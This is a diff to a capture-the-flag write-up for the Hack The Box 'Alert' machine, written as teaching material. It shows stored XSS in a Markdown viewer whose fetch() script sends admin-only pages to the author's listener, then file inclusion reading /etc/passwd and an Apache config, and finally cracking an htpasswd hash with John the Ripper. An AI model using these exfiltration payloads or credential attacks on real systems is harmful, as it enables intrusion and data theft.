@@ -61,28 +61,11 @@ Note that all of these pages are using a `?page=` query parameter to specify the
 ```
 $ curl http://alert.htb/index.php?page=../../../../etc/passwd
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="css/style.css">
-    <title>Alert - Markdown Viewer</title>
-</head>
-<body>
-    <nav>
-        <a href="index.php?page=alert">Markdown Viewer</a>
-        <a href="index.php?page=contact">Contact Us</a>
-        <a href="index.php?page=about">About Us</a>
-        <a href="index.php?page=donate">Donate</a>
-            </nav>
-    <div class="container">
-        <h1>Error: Page not found</h1>    </div>
-    <footer>
-        <p style="color: black;">© 2024 Alert. All rights reserved.</p>
-    </footer>
-</body>
-</html>
+...
+
+<h1>Error: Page not found</h1>
+
+...
 ```
 
 That doesn't work, it just gives us back a "Page not found". Let's move on. We can quickly eliminate the "Donate" page from our list as the number input on that page does not seem to do anything. Let's try to upload some (nasty) Markdown file:
@@ -92,15 +75,68 @@ $ cat hello.md
 
 # HELLO WORLD
 <script>
-alert("HEY!")
+alert("XSS")
 </script>
 ```
 
 When we upload this, we can see that the script is definitely being executed:
 
-![TODO](TODO)
+![The alert function is being executed](./images/alert-triggered.png)
 
-## More (hidden) pages
+When we dismiss the alert, the rendered page appears:
+
+![The rendered page appears with a heading](./images/share-button.png)
+
+In the bottom right, a "Share Markdown" button appears! If we send this link to others, we can get the script to execute on their machine!
+
+Let's think back to the "About Us" page. It said that an "administrator" will read all contact messages. What if we send this share link in a contact message to this adminstrator, will he open the link and execute the script on his machine? We cannot get a "reverse shell" through Javascript in the browser, but maybe we'll be able to access more files from his perspective that are unreachable from the front!
+
+To do this, we'll need to set up a way for the script to communicate back to us. Here's my plan:
+
+1. I'll set up a Python HTTP server
+2. I'll modify the script to make a connection back to this server
+
+If we can get TWO connections back, we'll know that the script executed on both my machine AND on the adminstrator machine.
+
+Okay, step 1. The Python server:
+
+```
+$ python -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+That's running, now let's modify the script and upload it:
+
+```
+$ cat fromtheotherside.md
+
+# Hello Administrator, how are you doing?
+<script>
+fetch("http://10.10.14.8:8000/greetings");
+</script>
+```
+
+The `10.10.14.8` is the IP address of my attacker box on which Python is listening. Immediately after uploading the file we get the first hit:
+
+```
+$ python -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.14.8 - - [12/Dec/2024 14:46:07] code 404, message File not found
+10.10.14.8 - - [12/Dec/2024 14:46:07] "GET /greetings HTTP/1.1" 404 -
+```
+
+This is coming from OUR machine, when we land on the `visualizer.php`. Now let's send this link to the administrator:
+
+![we share the link through the contact form](./images/share-link-in-contact.png)
+
+And we have another hit, this time coming from the box itself:
+
+```
+10.10.11.44 - - [12/Dec/2024 14:48:35] code 404, message File not found
+10.10.11.44 - - [12/Dec/2024 14:48:35] "GET /greetings HTTP/1.1" 404 -
+```
+
+Great! Our plan is working. But we have no idea what to do now. We could try to `fetch()` some files and then send their contents back to the Python server. But which files? Let's try to find some potential target files with a directory buster.
 
 ```
 $ gobuster dir --url http://alert.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
@@ -132,11 +168,7 @@ Finished
 ===============================================================
 ```
 
-## Getting the messages
-
-In order to gain access to the SSH server, we are looking for credentials. There could be file inclusion on the `?page=` parameter but
-
-On the "About Us" page it is mentioned that a "administrator" will read the "contact" messages you send. This is a clue! Furthermore, we discovered a
+I am particularly interested in `/messages`. We are not currently allowed to read that page but an administrator might! We'll build our evil script to fetch the contents of this page and send them back to us:
 
 ```js
 # My evil script!
@@ -150,14 +182,7 @@ fetch("http://alert.htb/messages.php")
 </script>
 ```
 
-1. I upload this Markdown file containing a script to the web application.
-   ![uploading the script as a Markdown file](./images/uploaded-script.png)
-2. Then I start a Python HTTP server on port 8000
-3. I copy the "Share" link into the Contact form and press "Send"
-   ![pasting the share link into the Contact ](./images/share-link-in-contact.png)
-4. Win!
-
-On the Python HTTP server I receive a message:
+When we upload the file and share the link through the content form, I receive a message on the HTTP server:
 
 ```
 $ python3 -m http.server 8000
@@ -166,11 +191,13 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.11.44 - - [11/Dec/2024 15:49:00] "GET /?data=%3Ch1%3EMessages%3C%2Fh1%3E%3Cul%3E%3Cli%3E%3Ca%20href%3D%27messages.php%3Ffile%3D2024-03-10_15-48-34.txt%27%3E2024-03-10_15-48-34.txt%3C%2Fa%3E%3C%2Fli%3E%3C%2Ful%3E%0A HTTP/1.1" 200 -
 ```
 
+The first request comes from our machine (`10.10.14.8`), but the second request is, again, coming from the box itself. And it includes some data!
+
 This data string is URL-encoded, but nothing we can't reverse with a little CyberChef:
 
 ![using CyberChef to URL-decode the data](./images/cyberchef-messages.png)
 
-There is a reference to a `2024-03-10_15-48-34.txt` file, and it is being loaded using a `?file=` parameter. Maybe this one IS vulnerable to file inclusion! Let's try to load `/etc/passwd`:
+There is a reference to a `2024-03-10_15-48-34.txt` file, and it is being loaded using a `?file=` parameter. Maybe this parameter IS vulnerable to file inclusion! Let's try to load `/etc/passwd`:
 
 ```js
 <script>
@@ -191,42 +218,14 @@ I've gone ahead and decoded this:
 ```
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
-syslog:x:104:110::/home/syslog:/usr/sbin/nologin
-_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
-tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
-uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
-landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
-pollinate:x:110:1::/var/cache/pollinate:/bin/false
-fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
-usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+...
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 albert:x:1000:1000:albert:/home/albert:/bin/bash
 lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 david:x:1001:1002:,,,:/home/david:/bin/bash
 ```
 
-All the way at the bottom we find two users, `albert` and `david`. Now we just need to find a password!
+At the bottom of the file we find two users, `albert` and `david`. Now we just need to find a password!
 
 I'll try another file: `/etc/apache2/sites-enabled/000-default.conf`:
 
@@ -246,7 +245,7 @@ And after going through the steps, we have another response at our Python listen
 10.10.11.44 - - [11/Dec/2024 17:11:15] "GET /?data=%3Cpre%3E%3CVirtualHost%20*%3A80%3E%0A%20%20%20%20ServerName%20alert.htb%0A%0A%20%20%20%20DocumentRoot%20%2Fvar%2Fwww%2Falert.htb%0A%0A%20%20%20%20%3CDirectory%20%2Fvar%2Fwww%2Falert.htb%3E%0A%20%20%20%20%20%20%20%20Options%20FollowSymLinks%20MultiViews%0A%20%20%20%20%20%20%20%20AllowOverride%20All%0A%20%20%20%20%3C%2FDirectory%3E%0A%0A%20%20%20%20RewriteEngine%20On%0A%20%20%20%20RewriteCond%20%25%7BHTTP_HOST%7D%20!%5Ealert%5C.htb%24%0A%20%20%20%20RewriteCond%20%25%7BHTTP_HOST%7D%20!%5E%24%0A%20%20%20%20RewriteRule%20%5E%2F%3F(.*)%24%20http%3A%2F%2Falert.htb%2F%241%20%5BR%3D301%2CL%5D%0A%0A%20%20%20%20ErrorLog%20%24%7BAPACHE_LOG_DIR%7D%2Ferror.log%0A%20%20%20%20CustomLog%20%24%7BAPACHE_LOG_DIR%7D%2Faccess.log%20combined%0A%3C%2FVirtualHost%3E%0A%0A%3CVirtualHost%20*%3A80%3E%0A%20%20%20%20ServerName%20statistics.alert.htb%0A%0A%20%20%20%20DocumentRoot%20%2Fvar%2Fwww%2Fstatistics.alert.htb%0A%0A%20%20%20%20%3CDirectory%20%2Fvar%2Fwww%2Fstatistics.alert.htb%3E%0A%20%20%20%20%20%20%20%20Options%20FollowSymLinks%20MultiViews%0A%20%20%20%20%20%20%20%20AllowOverride%20All%0A%20%20%20%20%3C%2FDirectory%3E%0A%0A%20%20%20%20%3CDirectory%20%2Fvar%2Fwww%2Fstatistics.alert.htb%3E%0A%20%20%20%20%20%20%20%20Options%20Indexes%20FollowSymLinks%20MultiViews%0A%20%20%20%20%20%20%20%20AllowOverride%20All%0A%20%20%20%20%20%20%20%20AuthType%20Basic%0A%20%20%20%20%20%20%20%20AuthName%20%22Restricted%20Area%22%0A%20%20%20%20%20%20%20%20AuthUserFile%20%2Fvar%2Fwww%2Fstatistics.alert.htb%2F.htpasswd%0A%20%20%20%20%20%20%20%20Require%20valid-user%0A%20%20%20%20%3C%2FDirectory%3E%0A%0A%20%20%20%20ErrorLog%20%24%7BAPACHE_LOG_DIR%7D%2Ferror.log%0A%20%20%20%20CustomLog%20%24%7BAPACHE_LOG_DIR%7D%2Faccess.log%20combined%0A%3C%2FVirtualHost%3E%0A%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 -
 ```
 
-What is this blob of junk you ask? Well:
+What is this blob of junk you ask? Well, you should ask my decoding friend:
 
 ```
 <VirtualHost *:80>
@@ -311,8 +310,6 @@ This looks like a password hash for the user `albert`!
 ## Cracking ahead
 
 ```
-$ echo '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > albert-hash.txt
-
 $ hashid albert-hash.txt
 
 --File 'albert-hash.txt'--
@@ -322,14 +319,28 @@ Analyzing '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/'
 --End of file 'albert-hash.txt'--
 ```
 
-We can use John the Ripper to crack this hash! When looking up what kind of hash it is I found:
+We can try using John the Ripper to crack this Apache MD5 hash. When looking up what kind of hash it is I found:
 
 > The MD5 algorithm used by htpasswd is specific to the Apache software; passwords hashed using it will not be usable with other Web servers.
 
-So we will need a password list that is big and juicy: we'll go with `rockyou.txt`.
+So we will need a password list that is big and juicy: we'll go with `rockyou.txt`. We'll let John the Ripper identify the "hash format":
 
 ```
-$ john --format=md5crypt-long --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt albert-hash.txt
+$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt albert-hash.txt
+
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 ASIMD 4x2])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+```
+
+This seems to hang/not produce a result, so let's try again with the flag `--format=md5crypt-long`:
+
+```
+$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt albert-hash.txt --format=md5crypt-long
+
 Using default input encoding: UTF-8
 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
 Will run 4 OpenMP threads
